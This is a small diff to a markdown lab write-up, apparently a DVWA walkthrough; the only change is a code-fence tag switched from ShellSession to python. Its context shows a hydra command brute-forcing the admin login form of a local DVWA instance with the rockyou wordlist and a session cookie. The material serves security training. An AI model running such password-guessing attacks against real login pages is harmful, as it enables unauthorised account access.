@@ -81,7 +81,7 @@ Of course, it has to be Hello World, right?
 
 <details><summary markdown="span">Click to see output </summary>
   
-```ShellSession
+```python
   
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
 └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
